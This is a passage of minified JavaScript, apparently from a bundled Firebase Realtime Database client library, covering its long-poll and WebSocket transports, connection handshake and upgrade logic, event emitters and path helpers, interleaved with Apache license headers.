 */const cu={},du={};function ih(t){const e=t.toString();return cu[e]||(cu[e]=new fR),cu[e]}function pR(t,e){const n=t.toString();return du[n]||(du[n]=e()),du[n]}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class mR{constructor(e){this.onMessage_=e,this.pendingResponses=[],this.currentResponseNum=0,this.closeAfterResponse=-1,this.onClose=null}closeAfter(e,n){this.closeAfterResponse=e,this.onClose=n,this.closeAfterResponse<this.currentResponseNum&&(this.onClose(),this.onClose=null)}handleResponse(e,n){for(this.pendingResponses[e]=n;this.pendingResponses[this.currentResponseNum];){const r=this.pendingResponses[this.currentResponseNum];delete this.pendingResponses[this.currentResponseNum];for(let i=0;i<r.length;++i)r[i]&&wi(()=>{this.onMessage_(r[i])});if(this.currentResponseNum===this.closeAfterResponse){this.onClose&&(this.onClose(),this.onClose=null);break}this.currentResponseNum++}}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Fp="start",gR="close",_R="pLPCommand",vR="pRTLPCB",uy="id",cy="pw",dy="ser",yR="cb",wR="seg",ER="ts",CR="d",SR="dframe",hy=1870,fy=30,TR=hy-fy,IR=25e3,kR=3e4;class jr{constructor(e,n,r,i,s,o,l){this.connId=e,this.repoInfo=n,this.applicationId=r,this.appCheckToken=i,this.authToken=s,this.transportSessionId=o,this.lastSessionId=l,this.bytesSent=0,this.bytesReceived=0,this.everConnected_=!1,this.log_=Js(e),this.stats_=ih(n),this.urlFn=a=>(this.appCheckToken&&(a[kc]=this.appCheckToken),ay(n,oy,a))}open(e,n){this.curSegmentNum=0,this.onDisconnect_=n,this.myPacketOrderer=new mR(e),this.isClosed_=!1,this.connectTimeoutTimer_=setTimeout(()=>{this.log_("Timed out trying to connect."),this.onClosed_(),this.connectTimeoutTimer_=null},Math.floor(kR)),tR(()=>{if(this.isClosed_)return;this.scriptTagHolder=new sh((...s)=>{const[o,l,a,u,c]=s;if(this.incrementIncomingBytes_(s),!!this.scriptTagHolder)if(this.connectTimeoutTimer_&&(clearTimeout(this.connectTimeoutTimer_),this.connectTimeoutTimer_=null),this.everConnected_=!0,o===Fp)this.id=l,this.password=a;else if(o===gR)l?(this.scriptTagHolder.sendNewPolls=!1,this.myPacketOrderer.closeAfter(l,()=>{this.onClosed_()})):this.onClosed_();else throw new Error("Unrecognized command received: "+o)},(...s)=>{const[o,l]=s;this.incrementIncomingBytes_(s),this.myPacketOrderer.handleResponse(o,l)},()=>{this.onClosed_()},this.urlFn);const r={};r[Fp]="t",r[dy]=Math.floor(Math.random()*1e8),this.scriptTagHolder.uniqueCallbackIdentifier&&(r[yR]=this.scriptTagHolder.uniqueCallbackIdentifier),r[Jv]=rh,this.transportSessionId&&(r[Zv]=this.transportSessionId),this.lastSessionId&&(r[ry]=this.lastSessionId),this.applicationId&&(r[iy]=this.applicationId),this.appCheckToken&&(r[kc]=this.appCheckToken),typeof location<"u"&&location.hostname&&ny.test(location.hostname)&&(r[ey]=ty);const i=this.urlFn(r);this.log_("Connecting via long-poll to "+i),this.scriptTagHolder.addTag(i,()=>{})})}start(){this.scriptTagHolder.startLongPoll(this.id,this.password),this.addDisconnectPingFrame(this.id,this.password)}static forceAllow(){jr.forceAllow_=!0}static forceDisallow(){jr.forceDisallow_=!0}static isAvailable(){return jr.forceAllow_?!0:!jr.forceDisallow_&&typeof document<"u"&&document.createElement!=null&&!rR()&&!iR()}markConnectionHealthy(){}shutdown_(){this.isClosed_=!0,this.scriptTagHolder&&(this.scriptTagHolder.close(),this.scriptTagHolder=null),this.myDisconnFrame&&(document.body.removeChild(this.myDisconnFrame),this.myDisconnFrame=null),this.connectTimeoutTimer_&&(clearTimeout(this.connectTimeoutTimer_),this.connectTimeoutTimer_=null)}onClosed_(){this.isClosed_||(this.log_("Longpoll is closing itself"),this.shutdown_(),this.onDisconnect_&&(this.onDisconnect_(this.everConnected_),this.onDisconnect_=null))}close(){this.isClosed_||(this.log_("Longpoll is being closed."),this.shutdown_())}send(e){const n=ye(e);this.bytesSent+=n.length,this.stats_.incrementCounter("bytes_sent",n.length);const r=Z_(n),i=Qv(r,TR);for(let s=0;s<i.length;s++)this.scriptTagHolder.enqueueSegment(this.curSegmentNum,i.length,i[s]),this.curSegmentNum++}addDisconnectPingFrame(e,n){this.myDisconnFrame=document.createElement("iframe");const r={};r[SR]="t",r[uy]=e,r[cy]=n,this.myDisconnFrame.src=this.urlFn(r),this.myDisconnFrame.style.display="none",document.body.appendChild(this.myDisconnFrame)}incrementIncomingBytes_(e){const n=ye(e).length;this.bytesReceived+=n,this.stats_.incrementCounter("bytes_received",n)}}class sh{constructor(e,n,r,i){this.onDisconnect=r,this.urlFn=i,this.outstandingRequests=new Set,this.pendingSegs=[],this.currentSerial=Math.floor(Math.random()*1e8),this.sendNewPolls=!0;{this.uniqueCallbackIdentifier=Jk(),window[_R+this.uniqueCallbackIdentifier]=e,window[vR+this.uniqueCallbackIdentifier]=n,this.myIFrame=sh.createIFrame_();let s="";this.myIFrame.src&&this.myIFrame.src.substr(0,11)==="javascript:"&&(s='<script>document.domain="'+document.domain+'";<\/script>');const o="<html><body>"+s+"</body></html>";try{this.myIFrame.doc.open(),this.myIFrame.doc.write(o),this.myIFrame.doc.close()}catch(l){Pe("frame writing exception"),l.stack&&Pe(l.stack),Pe(l)}}}static createIFrame_(){const e=document.createElement("iframe");if(e.style.display="none",document.body){document.body.appendChild(e);try{e.contentWindow.document||Pe("No IE domain setting required")}catch{const r=document.domain;e.src="javascript:void((function(){document.open();document.domain='"+r+"';document.close();})())"}}else throw"Document body has not initialized. Wait to initialize Firebase until after the document is ready.";return e.contentDocument?e.doc=e.contentDocument:e.contentWindow?e.doc=e.contentWindow.document:e.document&&(e.doc=e.document),e}close(){this.alive=!1,this.myIFrame&&(this.myIFrame.doc.body.textContent="",setTimeout(()=>{this.myIFrame!==null&&(document.body.removeChild(this.myIFrame),this.myIFrame=null)},Math.floor(0)));const e=this.onDisconnect;e&&(this.onDisconnect=null,e())}startLongPoll(e,n){for(this.myID=e,this.myPW=n,this.alive=!0;this.newRequest_(););}newRequest_(){if(this.alive&&this.sendNewPolls&&this.outstandingRequests.size<(this.pendingSegs.length>0?2:1)){this.currentSerial++;const e={};e[uy]=this.myID,e[cy]=this.myPW,e[dy]=this.currentSerial;let n=this.urlFn(e),r="",i=0;for(;this.pendingSegs.length>0&&this.pendingSegs[0].d.length+fy+r.length<=hy;){const o=this.pendingSegs.shift();r=r+"&"+wR+i+"="+o.seg+"&"+ER+i+"="+o.ts+"&"+CR+i+"="+o.d,i++}return n=n+r,this.addLongPollTag_(n,this.currentSerial),!0}else return!1}enqueueSegment(e,n,r){this.pendingSegs.push({seg:e,ts:n,d:r}),this.alive&&this.newRequest_()}addLongPollTag_(e,n){this.outstandingRequests.add(n);const r=()=>{this.outstandingRequests.delete(n),this.newRequest_()},i=setTimeout(r,Math.floor(IR)),s=()=>{clearTimeout(i),r()};this.addTag(e,s)}addTag(e,n){setTimeout(()=>{try{if(!this.sendNewPolls)return;const r=this.myIFrame.doc.createElement("script");r.type="text/javascript",r.async=!0,r.src=e,r.onload=r.onreadystatechange=function(){const i=r.readyState;(!i||i==="loaded"||i==="complete")&&(r.onload=r.onreadystatechange=null,r.parentNode&&r.parentNode.removeChild(r),n())},r.onerror=()=>{Pe("Long-poll script failed to load: "+e),this.sendNewPolls=!1,this.close()},this.myIFrame.doc.body.appendChild(r)}catch{}},Math.floor(1))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const RR=16384,NR=45e3;let Al=null;typeof MozWebSocket<"u"?Al=MozWebSocket:typeof WebSocket<"u"&&(Al=WebSocket);class ht{constructor(e,n,r,i,s,o,l){this.connId=e,this.applicationId=r,this.appCheckToken=i,this.authToken=s,this.keepaliveTimer=null,this.frames=null,this.totalFrames=0,this.bytesSent=0,this.bytesReceived=0,this.log_=Js(this.connId),this.stats_=ih(n),this.connURL=ht.connectionURL_(n,o,l,i,r),this.nodeAdmin=n.nodeAdmin}static connectionURL_(e,n,r,i,s){const o={};return o[Jv]=rh,typeof location<"u"&&location.hostname&&ny.test(location.hostname)&&(o[ey]=ty),n&&(o[Zv]=n),r&&(o[ry]=r),i&&(o[kc]=i),s&&(o[iy]=s),ay(e,sy,o)}open(e,n){this.onDisconnect=n,this.onMessage=e,this.log_("Websocket connecting to "+this.connURL),this.everConnected_=!1,$n.set("previous_websocket_failure",!0);try{let r;lv(),this.mySock=new Al(this.connURL,[],r)}catch(r){this.log_("Error instantiating WebSocket.");const i=r.message||r.data;i&&this.log_(i),this.onClosed_();return}this.mySock.onopen=()=>{this.log_("Websocket connected."),this.everConnected_=!0},this.mySock.onclose=()=>{this.log_("Websocket connection was disconnected."),this.mySock=null,this.onClosed_()},this.mySock.onmessage=r=>{this.handleIncomingFrame(r)},this.mySock.onerror=r=>{this.log_("WebSocket error.  Closing connection.");const i=r.message||r.data;i&&this.log_(i),this.onClosed_()}}start(){}static forceDisallow(){ht.forceDisallow_=!0}static isAvailable(){let e=!1;if(typeof navigator<"u"&&navigator.userAgent){const n=/Android ([0-9]{0,}\.[0-9]{0,})/,r=navigator.userAgent.match(n);r&&r.length>1&&parseFloat(r[1])<4.4&&(e=!0)}return!e&&Al!==null&&!ht.forceDisallow_}static previouslyFailed(){return $n.isInMemoryStorage||$n.get("previous_websocket_failure")===!0}markConnectionHealthy(){$n.remove("previous_websocket_failure")}appendFrame_(e){if(this.frames.push(e),this.frames.length===this.totalFrames){const n=this.frames.join("");this.frames=null;const r=Is(n);this.onMessage(r)}}handleNewFrameCount_(e){this.totalFrames=e,this.frames=[]}extractFrameCount_(e){if(S(this.frames===null,"We already have a frame buffer"),e.length<=6){const n=Number(e);if(!isNaN(n))return this.handleNewFrameCount_(n),null}return this.handleNewFrameCount_(1),e}handleIncomingFrame(e){if(this.mySock===null)return;const n=e.data;if(this.bytesReceived+=n.length,this.stats_.incrementCounter("bytes_received",n.length),this.resetKeepAlive(),this.frames!==null)this.appendFrame_(n);else{const r=this.extractFrameCount_(n);r!==null&&this.appendFrame_(r)}}send(e){this.resetKeepAlive();const n=ye(e);this.bytesSent+=n.length,this.stats_.incrementCounter("bytes_sent",n.length);const r=Qv(n,RR);r.length>1&&this.sendString_(String(r.length));for(let i=0;i<r.length;i++)this.sendString_(r[i])}shutdown_(){this.isClosed_=!0,this.keepaliveTimer&&(clearInterval(this.keepaliveTimer),this.keepaliveTimer=null),this.mySock&&(this.mySock.close(),this.mySock=null)}onClosed_(){this.isClosed_||(this.log_("WebSocket is closing itself"),this.shutdown_(),this.onDisconnect&&(this.onDisconnect(this.everConnected_),this.onDisconnect=null))}close(){this.isClosed_||(this.log_("WebSocket is being closed"),this.shutdown_())}resetKeepAlive(){clearInterval(this.keepaliveTimer),this.keepaliveTimer=setInterval(()=>{this.mySock&&this.sendString_("0"),this.resetKeepAlive()},Math.floor(NR))}sendString_(e){try{this.mySock.send(e)}catch(n){this.log_("Exception thrown from WebSocket.send():",n.message||n.data,"Closing connection."),setTimeout(this.onClosed_.bind(this),0)}}}ht.responsesRequiredToBeHealthy=2;ht.healthyTimeout=3e4;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class xs{constructor(e){this.initTransports_(e)}static get ALL_TRANSPORTS(){return[jr,ht]}static get IS_TRANSPORT_INITIALIZED(){return this.globalTransportInitialized_}initTransports_(e){const n=ht&&ht.isAvailable();let r=n&&!ht.previouslyFailed();if(e.webSocketOnly&&(n||qe("wss:// URL used, but browser isn't known to support websockets.  Trying anyway."),r=!0),r)this.transports_=[ht];else{const i=this.transports_=[];for(const s of xs.ALL_TRANSPORTS)s&&s.isAvailable()&&i.push(s);xs.globalTransportInitialized_=!0}}initialTransport(){if(this.transports_.length>0)return this.transports_[0];throw new Error("No transports available")}upgradeTransport(){return this.transports_.length>1?this.transports_[1]:null}}xs.globalTransportInitialized_=!1;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const PR=6e4,xR=5e3,AR=10*1024,OR=100*1024,hu="t",jp="d",bR="s",zp="r",LR="e",Bp="o",Hp="a",Wp="n",$p="p",DR="h";class MR{constructor(e,n,r,i,s,o,l,a,u,c){this.id=e,this.repoInfo_=n,this.applicationId_=r,this.appCheckToken_=i,this.authToken_=s,this.onMessage_=o,this.onReady_=l,this.onDisconnect_=a,this.onKill_=u,this.lastSessionId=c,this.connectionCount=0,this.pendingDataMessages=[],this.state_=0,this.log_=Js("c:"+this.id+":"),this.transportManager_=new xs(n),this.log_("Connection created"),this.start_()}start_(){const e=this.transportManager_.initialTransport();this.conn_=new e(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,null,this.lastSessionId),this.primaryResponsesRequired_=e.responsesRequiredToBeHealthy||0;const n=this.connReceiver_(this.conn_),r=this.disconnReceiver_(this.conn_);this.tx_=this.conn_,this.rx_=this.conn_,this.secondaryConn_=null,this.isHealthy_=!1,setTimeout(()=>{this.conn_&&this.conn_.open(n,r)},Math.floor(0));const i=e.healthyTimeout||0;i>0&&(this.healthyTimeout_=ns(()=>{this.healthyTimeout_=null,this.isHealthy_||(this.conn_&&this.conn_.bytesReceived>OR?(this.log_("Connection exceeded healthy timeout but has received "+this.conn_.bytesReceived+" bytes.  Marking connection healthy."),this.isHealthy_=!0,this.conn_.markConnectionHealthy()):this.conn_&&this.conn_.bytesSent>AR?this.log_("Connection exceeded healthy timeout but has sent "+this.conn_.bytesSent+" bytes.  Leaving connection alive."):(this.log_("Closing unhealthy connection after timeout."),this.close()))},Math.floor(i)))}nextTransportId_(){return"c:"+this.id+":"+this.connectionCount++}disconnReceiver_(e){return n=>{e===this.conn_?this.onConnectionLost_(n):e===this.secondaryConn_?(this.log_("Secondary connection lost."),this.onSecondaryConnectionLost_()):this.log_("closing an old connection")}}connReceiver_(e){return n=>{this.state_!==2&&(e===this.rx_?this.onPrimaryMessageReceived_(n):e===this.secondaryConn_?this.onSecondaryMessageReceived_(n):this.log_("message on old connection"))}}sendRequest(e){const n={t:"d",d:e};this.sendData_(n)}tryCleanupConnection(){this.tx_===this.secondaryConn_&&this.rx_===this.secondaryConn_&&(this.log_("cleaning up and promoting a connection: "+this.secondaryConn_.connId),this.conn_=this.secondaryConn_,this.secondaryConn_=null)}onSecondaryControl_(e){if(hu in e){const n=e[hu];n===Hp?this.upgradeIfSecondaryHealthy_():n===zp?(this.log_("Got a reset on secondary, closing it"),this.secondaryConn_.close(),(this.tx_===this.secondaryConn_||this.rx_===this.secondaryConn_)&&this.close()):n===Bp&&(this.log_("got pong on secondary."),this.secondaryResponsesRequired_--,this.upgradeIfSecondaryHealthy_())}}onSecondaryMessageReceived_(e){const n=bi("t",e),r=bi("d",e);if(n==="c")this.onSecondaryControl_(r);else if(n==="d")this.pendingDataMessages.push(r);else throw new Error("Unknown protocol layer: "+n)}upgradeIfSecondaryHealthy_(){this.secondaryResponsesRequired_<=0?(this.log_("Secondary connection is healthy."),this.isHealthy_=!0,this.secondaryConn_.markConnectionHealthy(),this.proceedWithUpgrade_()):(this.log_("sending ping on secondary."),this.secondaryConn_.send({t:"c",d:{t:$p,d:{}}}))}proceedWithUpgrade_(){this.secondaryConn_.start(),this.log_("sending client ack on secondary"),this.secondaryConn_.send({t:"c",d:{t:Hp,d:{}}}),this.log_("Ending transmission on primary"),this.conn_.send({t:"c",d:{t:Wp,d:{}}}),this.tx_=this.secondaryConn_,this.tryCleanupConnection()}onPrimaryMessageReceived_(e){const n=bi("t",e),r=bi("d",e);n==="c"?this.onControl_(r):n==="d"&&this.onDataMessage_(r)}onDataMessage_(e){this.onPrimaryResponse_(),this.onMessage_(e)}onPrimaryResponse_(){this.isHealthy_||(this.primaryResponsesRequired_--,this.primaryResponsesRequired_<=0&&(this.log_("Primary connection is healthy."),this.isHealthy_=!0,this.conn_.markConnectionHealthy()))}onControl_(e){const n=bi(hu,e);if(jp in e){const r=e[jp];if(n===DR){const i=Object.assign({},r);this.repoInfo_.isUsingEmulator&&(i.h=this.repoInfo_.host),this.onHandshake_(i)}else if(n===Wp){this.log_("recvd end transmission on primary"),this.rx_=this.secondaryConn_;for(let i=0;i<this.pendingDataMessages.length;++i)this.onDataMessage_(this.pendingDataMessages[i]);this.pendingDataMessages=[],this.tryCleanupConnection()}else n===bR?this.onConnectionShutdown_(r):n===zp?this.onReset_(r):n===LR?Ic("Server Error: "+r):n===Bp?(this.log_("got pong on primary."),this.onPrimaryResponse_(),this.sendPingOnPrimaryIfNecessary_()):Ic("Unknown control packet command: "+n)}}onHandshake_(e){const n=e.ts,r=e.v,i=e.h;this.sessionId=e.s,this.repoInfo_.host=i,this.state_===0&&(this.conn_.start(),this.onConnectionEstablished_(this.conn_,n),rh!==r&&qe("Protocol version mismatch detected"),this.tryStartUpgrade_())}tryStartUpgrade_(){const e=this.transportManager_.upgradeTransport();e&&this.startUpgrade_(e)}startUpgrade_(e){this.secondaryConn_=new e(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,this.sessionId),this.secondaryResponsesRequired_=e.responsesRequiredToBeHealthy||0;const n=this.connReceiver_(this.secondaryConn_),r=this.disconnReceiver_(this.secondaryConn_);this.secondaryConn_.open(n,r),ns(()=>{this.secondaryConn_&&(this.log_("Timed out trying to upgrade."),this.secondaryConn_.close())},Math.floor(PR))}onReset_(e){this.log_("Reset packet received.  New host: "+e),this.repoInfo_.host=e,this.state_===1?this.close():(this.closeConnections_(),this.start_())}onConnectionEstablished_(e,n){this.log_("Realtime connection established."),this.conn_=e,this.state_=1,this.onReady_&&(this.onReady_(n,this.sessionId),this.onReady_=null),this.primaryResponsesRequired_===0?(this.log_("Primary connection is healthy."),this.isHealthy_=!0):ns(()=>{this.sendPingOnPrimaryIfNecessary_()},Math.floor(xR))}sendPingOnPrimaryIfNecessary_(){!this.isHealthy_&&this.state_===1&&(this.log_("sending ping on primary."),this.sendData_({t:"c",d:{t:$p,d:{}}}))}onSecondaryConnectionLost_(){const e=this.secondaryConn_;this.secondaryConn_=null,(this.tx_===e||this.rx_===e)&&this.close()}onConnectionLost_(e){this.conn_=null,!e&&this.state_===0?(this.log_("Realtime connection failed."),this.repoInfo_.isCacheableHost()&&($n.remove("host:"+this.repoInfo_.host),this.repoInfo_.internalHost=this.repoInfo_.host)):this.state_===1&&this.log_("Realtime connection lost."),this.close()}onConnectionShutdown_(e){this.log_("Connection shutdown command received. Shutting down..."),this.onKill_&&(this.onKill_(e),this.onKill_=null),this.onDisconnect_=null,this.close()}sendData_(e){if(this.state_!==1)throw"Connection is not connected";this.tx_.send(e)}close(){this.state_!==2&&(this.log_("Closing realtime connection."),this.state_=2,this.closeConnections_(),this.onDisconnect_&&(this.onDisconnect_(),this.onDisconnect_=null))}closeConnections_(){this.log_("Shutting down all connections"),this.conn_&&(this.conn_.close(),this.conn_=null),this.secondaryConn_&&(this.secondaryConn_.close(),this.secondaryConn_=null),this.healthyTimeout_&&(clearTimeout(this.healthyTimeout_),this.healthyTimeout_=null)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class py{put(e,n,r,i){}merge(e,n,r,i){}refreshAuthToken(e){}refreshAppCheckToken(e){}onDisconnectPut(e,n,r){}onDisconnectMerge(e,n,r){}onDisconnectCancel(e,n){}reportStats(e){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class my{constructor(e){this.allowedEvents_=e,this.listeners_={},S(Array.isArray(e)&&e.length>0,"Requires a non-empty array")}trigger(e,...n){if(Array.isArray(this.listeners_[e])){const r=[...this.listeners_[e]];for(let i=0;i<r.length;i++)r[i].callback.apply(r[i].context,n)}}on(e,n,r){this.validateEventType_(e),this.listeners_[e]=this.listeners_[e]||[],this.listeners_[e].push({callback:n,context:r});const i=this.getInitialEvent(e);i&&n.apply(r,i)}off(e,n,r){this.validateEventType_(e);const i=this.listeners_[e]||[];for(let s=0;s<i.length;s++)if(i[s].callback===n&&(!r||r===i[s].context)){i.splice(s,1);return}}validateEventType_(e){S(this.allowedEvents_.find(n=>n===e),"Unknown event: "+e)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ol extends my{constructor(){super(["online"]),this.online_=!0,typeof window<"u"&&typeof window.addEventListener<"u"&&!Hd()&&(window.addEventListener("online",()=>{this.online_||(this.online_=!0,this.trigger("online",!0))},!1),window.addEventListener("offline",()=>{this.online_&&(this.online_=!1,this.trigger("online",!1))},!1))}static getInstance(){return new Ol}getInitialEvent(e){return S(e==="online","Unknown event type: "+e),[this.online_]}currentlyOnline(){return this.online_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Vp=32,qp=768;let q=class{constructor(e,n){if(n===void 0){this.pieces_=e.split("/");let r=0;for(let i=0;i<this.pieces_.length;i++)this.pieces_[i].length>0&&(this.pieces_[r]=this.pieces_[i],r++);this.pieces_.length=r,this.pieceNum_=0}else this.pieces_=e,this.pieceNum_=n}toString(){let e="";for(let n=this.pieceNum_;n<this.pieces_.length;n++)this.pieces_[n]!==""&&(e+="/"+this.pieces_[n]);return e||"/"}};function H(){return new q("")}function M(t){return t.pieceNum_>=t.pieces_.length?null:t.pieces_[t.pieceNum_]}function Nn(t){return t.pieces_.length-t.pieceNum_}function G(t){let e=t.pieceNum_;return e<t.pieces_.length&&e++,new q(t.pieces_,e)}function gy(t){return t.pieceNum_<t.pieces_.length?t.pieces_[t.pieces_.length-1]:null}function UR(t){let e="";for(let n=t.pieceNum_;n<t.pieces_.length;n++)t.pieces_[n]!==""&&(e+="/"+encodeURIComponent(String(t.pieces_[n])));return e||"/"}function _y(t,e=0){return t.pieces_.slice(t.pieceNum_+e)}function vy(t){if(t.pieceNum_>=t.pieces_.length)return null;const e=[];for(let n=t.pieceNum_;n<t.pieces_.length-1;n++)e.push(t.pieces_[n]);return new q(e,0)}function fe(t,e){const n=[];for(let r=t.pieceNum_;r<t.pieces_.length;r++)n.push(t.pieces_[r]);if(e instanceof q)for(let r=e.pieceNum_;r<e.pieces_.length;r++)n.push(e.pieces_[r]);else{const r=e.split("/");for(let i=0;i<r.length;i++)r[i].length>0&&n.push(r[i])}return new q(n,0)}function j(t){return t.pieceNum_>=t.pieces_.length}function Be(t,e){const n=M(t),r=M(e);if(n===null)return e;if(n===r)return Be(G(t),G(e));throw new Error("INTERNAL ERROR: innerPath ("+e+") is not within outerPath ("+t+")")}function oh(t,e){if(Nn(t)!==Nn(e))return!1;for(let n=t.pieceNum_,r=e.pieceNum_;n<=t.pieces_.length;n++,r++)if(t.pieces_[n]!==e.pieces_[r])return!1;return!0}function ft(t,e){let n=t.pieceNum_,r=e.pieceNum_;if(Nn(t)>Nn(e))return!1;for(;n<t.pieces_.length;){if(t.pieces_[n]!==e.pieces_[r])return!1;++n,++r}return!0}class FR{constructor(e,n){this.errorPrefix_=n,this.parts_=_y(e,0),this.byteLength_=Math.max(1,this.parts_.length);for(let r=0;r<this.parts_.length;r++)this.byteLength_+=da(this.parts_[r]);yy(this)}}function jR(t,e){t.parts_.length>0&&(t.byteLength_+=1),t.parts_.push(e),t.byteLength_+=da(e),yy(t)}function zR(t){const e=t.parts_.pop();t.byteLength_-=da(e),t.parts_.length>0&&(t.byteLength_-=1)}function yy(t){if(t.byteLength_>qp)throw new Error(t.errorPrefix_+"has a key path longer than "+qp+" bytes ("+t.byteLength_+").");if(t.parts_.length>Vp)throw new Error(t.errorPrefix_+"path specified exceeds the maximum depth that can be written ("+Vp+") or object contains a cycle "+zn(t))}function zn(t){return t.parts_.length===0?"":"in property '"+t.parts_.join(".")+"'"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lh extends my{constructor(){super(["visible"]);let e,n;typeof document<"u"&&typeof document.addEventListener<"u"&&(typeof document.hidden<"u"?(n="visibilitychange",e="hidden"):typeof document.mozHidden<"u"?(n="mozvisibilitychange",e="mozHidden"):typeof document.msHidden<"u"?(n="msvisibilitychange",e="msHidden"):typeof document.webkitHidden<"u"&&(n="webkitvisibilitychange",e="webkitHidden")),this.visible_=!0,n&&document.addEventListener(n,()=>{const r=!document[e];r!==this.visible_&&(this.visible_=r,this.trigger("visible",r))},!1)}static getInstance(){return new lh}getInitialEvent(e){return S(e==="visible","Unknown event type: "+e),[this.visible_]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
